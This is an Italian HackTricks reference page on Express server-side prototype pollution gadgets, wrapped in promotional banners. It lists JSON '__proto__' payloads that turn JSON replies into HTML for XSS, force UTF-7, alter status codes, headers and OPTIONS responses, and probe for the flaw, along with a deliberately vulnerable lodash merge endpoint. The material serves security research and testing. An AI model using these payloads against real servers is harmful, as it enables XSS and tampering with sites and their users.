# Gadgets di Prototype Pollution di Express

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) √® un motore di ricerca alimentato dal **dark web** che offre funzionalit√† **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware ruba-informazioni**.

Il loro obiettivo principale di WhiteIntel √® combattere i sequestri di account e gli attacchi ransomware derivanti da malware che rubano informazioni.

Puoi visitare il loro sito web e provare il loro motore **gratuitamente** su:

{% embed url="https://whiteintel.io" %}

***

## Servire risposte XSS

**Per ulteriori dettagli** [**dai un'occhiata alla ricerca originale**](https://portswigger.net/research/server-side-prototype-pollution)

### Cambiare il tipo di contenuto JSON in HTML

In un'app Express che utilizza una risposta con tipo di contenuto **JSON** e riflette un JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
In questi casi XSS non √® normalmente possibile con un tipo di contenuto JSON. Tuttavia, con la pollution del prototipo possiamo **confondere Express per servire una risposta HTML.** Questa vulnerabilit√† si basa sull'applicazione che utilizza **`res.send(obj)`** e utilizza il parser del corpo con il tipo di contenuto application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
### Rendere UTF7

√à possibile fare in modo che express **renda il contenuto UTF-7 con**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Tecniche di Scansione Sicure

### Spazi JSON

Il seguente PP far√† s√¨ che gli attributi all'interno di un JSON abbiano uno spazio extra che non romper√† la funzionalit√†:
```json
{"__proto__":{"json spaces": " "}}
```
Quindi un JSON riflesso sembrer√†:
```json
{"foo":  "bar"} -- Note the extra space
```
### Intestazioni Esposte

Il seguente gadget PP far√† s√¨ che il server invii l'intestazione HTTP: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Richiede che il modulo **CORS sia installato**

### **Metodo OPTIONS**

Con il seguente payload, √® possibile **nascondere un metodo da una risposta OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Stato**

√à possibile cambiare il **codice di stato restituito** utilizzando il seguente payload PP:
```json
{"__proto__":{"status":510}}
```
### Errore

Quando si assegna un prototipo con un tipo primitivo come una stringa, si produce una **operazione no-op poich√© il prototipo deve essere un oggetto**. Se si tenta di assegnare un oggetto prototipo a `Object.prototype` stesso, questo generer√† un'**eccezione**. Possiamo utilizzare questi due comportamenti per **rilevare se la prototipizzazione √® stata effettuata con successo**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Valore Riflesso

Quando un'applicazione include un oggetto nella sua risposta, creare un attributo con un **nome insolito insieme a `__proto__`** pu√≤ essere illuminante. In particolare, se viene restituito **solo l'attributo insolito** nella risposta, ci√≤ potrebbe indicare la vulnerabilit√† dell'applicazione:
```json
{"unusualName":"value","__proto__":"test"}
```
Inoltre, in scenari in cui viene utilizzata una libreria come Lodash, impostare una propriet√† sia tramite inquinamento del prototipo (PP) che direttamente all'interno dell'oggetto offre un altro approccio diagnostico. Se tale propriet√† viene omessa dalla risposta, ci√≤ suggerisce che Lodash sta verificando l'esistenza della propriet√† nell'oggetto di destinazione prima di unire:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Varie

### Consentire i punti

C'√® un'opzione in Express che ti permette di **creare oggetti dai parametri della stringa di query**.\
Potresti sicuramente usarlo in una **catena** di bug per sfruttare una **vulnerabilit√† di inquinamento del prototipo**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` crea un oggetto in Node.**

## Riferimenti

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) √® un motore di ricerca alimentato dal **dark web** che offre funzionalit√† **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware ruba-informazioni**.

Il loro obiettivo principale √® contrastare le violazioni degli account e gli attacchi ransomware derivanti da malware che rubano informazioni.

Puoi visitare il loro sito web e provare il loro motore **gratuitamente** su:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
